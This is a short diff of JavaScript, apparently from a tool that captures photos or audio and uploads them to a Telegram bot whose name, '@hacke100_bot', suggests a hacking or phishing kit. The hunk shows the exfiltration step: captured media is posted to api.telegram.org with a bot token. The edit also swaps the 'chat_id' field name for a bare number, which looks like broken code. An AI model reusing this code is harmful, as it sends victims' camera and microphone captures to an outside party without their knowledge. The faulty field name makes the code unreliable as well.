@@ -175,7 +175,7 @@
       const chatId = chatid;
 
       const formData = new FormData();
-      formData.append('chat_id', chatId);
+      formData.append('7532339931', chatId);
       formData.append(type === 'photo' ? 'photo' : 'audio', data, `@hacke100_bot.${type === 'photo' ? 'jpg' : 'wav'}`);
 
       fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
